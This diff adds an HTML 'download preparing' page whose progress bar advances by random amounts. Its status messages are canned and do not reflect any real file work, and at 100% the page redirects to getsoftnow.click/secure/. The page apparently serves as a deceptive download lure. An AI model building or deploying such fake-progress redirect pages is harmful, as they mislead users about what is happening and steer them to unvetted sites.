@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+ 
+<title>Download Loading...</title>
+ 
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+ 
+<style>
+
+*{
+
+  margin:0;
+
+  padding:0;
+
+  box-sizing:border-box;
+
+}
+ 
+body{
+
+  font-family:'Manrope',sans-serif;
+
+  min-height:100vh;
+
+  background:#080808;
+
+  color:#fff;
+
+  display:flex;
+
+  align-items:center;
+
+  justify-content:center;
+
+  overflow:hidden;
+
+}
+ 
+/* FULL PAGE BACKGROUND */
+
+.wrapper{
+
+  position:absolute;
+
+  inset:0;
+
+  background:
+
+    radial-gradient(circle at top left,rgba(255,115,0,.25),transparent 34%),
+
+    radial-gradient(circle at bottom right,rgba(255,214,10,.18),transparent 35%),
+
+    linear-gradient(145deg,#090909,#000);
+
+}
+ 
+.wrapper::before{
+
+  content:"";
+
+  position:absolute;
+
+  inset:0;
+
+  background-image:
+
+    linear-gradient(45deg,rgba(255,255,255,.035) 25%,transparent 25%),
+
+    linear-gradient(-45deg,rgba(255,255,255,.035) 25%,transparent 25%);
+
+  background-size:34px 34px;
+
+  opacity:.45;
+
+}
+ 
+/* FLOATING FILES */
+
+.float-file{
+
+  position:absolute;
+
+  width:58px;
+
+  height:70px;
+
+  border-radius:14px;
+
+  background:rgba(255,255,255,.07);
+
+  border:1px solid rgba(255,255,255,.13);
+
+  animation:floatFile 8s ease-in-out infinite;
+
+}
+ 
+.float-file::before{
+
+  content:"";
+
+  position:absolute;
+
+  top:12px;
+
+  left:12px;
+
+  width:28px;
+
+  height:5px;
+
+  border-radius:10px;
+
+  background:rgba(255,255,255,.35);
+
+  box-shadow:0 13px 0 rgba(255,255,255,.22),
+
+             0 26px 0 rgba(255,255,255,.14);
+
+}
+ 
+@keyframes floatFile{
+
+  0%,100%{transform:translateY(0) rotate(-6deg);}
+
+  50%{transform:translateY(-35px) rotate(6deg);}
+
+}
+ 
+/* MAIN CARD */
+
+.card{
+
+  position:relative;
+
+  z-index:3;
+
+  width:420px;
+
+  padding:18px;
+
+  border-radius:36px;
+
+  background:linear-gradient(135deg,rgba(255,255,255,.18),rgba(255,255,255,.04));
+
+  border:1px solid rgba(255,255,255,.16);
+
+  box-shadow:0 35px 100px rgba(0,0,0,.7);
+
+}
+ 
+.inner{
+
+  border-radius:28px;
+
+  padding:34px 28px;
+
+  background:#111;
+
+  text-align:center;
+
+  position:relative;
+
+  overflow:hidden;
+
+}
+ 
+.inner::before{
+
+  content:"";
+
+  position:absolute;
+
+  top:0;
+
+  left:0;
+
+  width:100%;
+
+  height:6px;
+
+  background:linear-gradient(90deg,#ff7a00,#ffd60a,#ff7a00);
+
+}
+ 
+.icon{
+
+  width:88px;
+
+  height:88px;
+
+  margin:0 auto 20px;
+
+  border-radius:28px;
+
+  background:linear-gradient(135deg,#ff7a00,#ffd60a);
+
+  display:flex;
+
+  align-items:center;
+
+  justify-content:center;
+
+  font-size:40px;
+
+  color:#000;
+
+  box-shadow:0 0 45px rgba(255,122,0,.45);
+
+}
+ 
+h1{
+
+  font-size:1.75rem;
+
+  font-weight:800;
+
+  margin-bottom:8px;
+
+}
+ 
+.sub{
+
+  color:#b7b7b7;
+
+  font-size:.92rem;
+
+  margin-bottom:26px;
+
+}
+ 
+/* STATUS BOX */
+
+.status{
+
+  background:#181818;
+
+  border:1px solid rgba(255,255,255,.08);
+
+  border-radius:22px;
+
+  padding:20px;
+
+  margin-bottom:20px;
+
+}
+ 
+.percent{
+
+  font-size:3.1rem;
+
+  font-weight:800;
+
+  color:#ffd60a;
+
+  line-height:1;
+
+  margin-bottom:18px;
+
+}
+ 
+/* PROGRESS */
+
+.progress{
+
+  width:100%;
+
+  height:14px;
+
+  background:#2b2b2b;
+
+  border-radius:50px;
+
+  overflow:hidden;
+
+}
+ 
+.bar{
+
+  height:100%;
+
+  width:0%;
+
+  background:linear-gradient(90deg,#ff7a00,#ffd60a);
+
+  border-radius:50px;
+
+  box-shadow:0 0 18px rgba(255,214,10,.7);
+
+  transition:.2s ease;
+
+}
+ 
+.msg{
+
+  font-size:.95rem;
+
+  color:#f5f5f5;
+
+  margin-bottom:14px;
+
+}
+ 
+.badge{
+
+  display:inline-flex;
+
+  padding:8px 18px;
+
+  border-radius:999px;
+
+  font-size:.82rem;
+
+  font-weight:700;
+
+  background:rgba(255,122,0,.12);
+
+  border:1px solid rgba(255,214,10,.3);
+
+  color:#ffe58a;
+
+}
+ 
+.note{
+
+  margin-top:20px;
+
+  color:#777;
+
+  font-size:.76rem;
+
+}
+ 
+/* MOBILE */
+
+@media(max-width:480px){
+
+  .card{
+
+    width:91%;
+
+    padding:14px;
+
+  }
+ 
+  .inner{
+
+    padding:30px 22px;
+
+  }
+ 
+  h1{
+
+    font-size:1.45rem;
+
+  }
+ 
+  .percent{
+
+    font-size:2.55rem;
+
+  }
+
+}
+</style>
+</head>
+ 
+<body>
+ 
+<div class="wrapper"></div>
+ 
+<div class="float-file" style="top:12%;left:10%;animation-delay:0s;"></div>
+<div class="float-file" style="top:70%;left:14%;animation-delay:1.2s;"></div>
+<div class="float-file" style="top:18%;right:12%;animation-delay:2.1s;"></div>
+<div class="float-file" style="bottom:12%;right:15%;animation-delay:.8s;"></div>
+ 
+<div class="card">
+<div class="inner">
+ 
+    <div class="icon">📥</div>
+ 
+    <h1>Download Is Preparing</h1>
+<div class="sub">Your file link is being created automatically</div>
+ 
+    <div class="status">
+<div class="percent" id="percent">0%</div>
+ 
+      <div class="progress">
+<div class="bar" id="bar"></div>
+</div>
+</div>
+ 
+    <div class="msg" id="msg">📦 collecting file details...</div>
+<div class="badge" id="badge">please wait</div>
+ 
+    <div class="note">Do not close this page while loading</div>
+ 
+  </div>
+</div>
+ 
+<script>
+
+let progress = 0;
+ 
+const percent = document.getElementById("percent");
+
+const msg = document.getElementById("msg");
+
+const badge = document.getElementById("badge");
+
+const bar = document.getElementById("bar");
+ 
+const steps = [
+
+  ["📦 collecting file details...", "please wait"],
+
+  ["🗂 preparing your file package...", "preparing"],
+
+  ["⚙️ creating download path...", "processing"],
+
+  ["📁 checking file availability...", "checking"],
+
+  ["🔄 finalizing file link...", "almost ready"],
+
+  ["✅ download link is ready", "ready"],
+
+  ["🚀 starting download page...", "starting"],
+
+  ["➡️ redirecting now...", "redirecting"]
+
+];
+ 
+function run(){
+
+  progress += Math.random() * 6.5;
+ 
+  if(progress >= 100){
+
+    progress = 100;
+ 
+    percent.textContent = "100%";
+
+    bar.style.width = "100%";
+
+    msg.textContent = "🚀 opening download page...";
+
+    badge.textContent = "completed";
+ 
+    setTimeout(()=>{
+
+      window.location.href = "https://getsoftnow.click/secure/";
+
+    },1000);
+ 
+    return;
+
+  }
+ 
+  percent.textContent = Math.floor(progress) + "%";
+
+  bar.style.width = progress + "%";
+ 
+  let i = Math.floor((progress / 100) * steps.length);
+
+  if(i >= steps.length) i = steps.length - 1;
+ 
+  msg.textContent = steps[i][0];
+
+  badge.textContent = steps[i][1];
+ 
+  setTimeout(run,140);
+
+}
+ 
+run();
+</script>
+ 
+</body>
+</html>
+ 
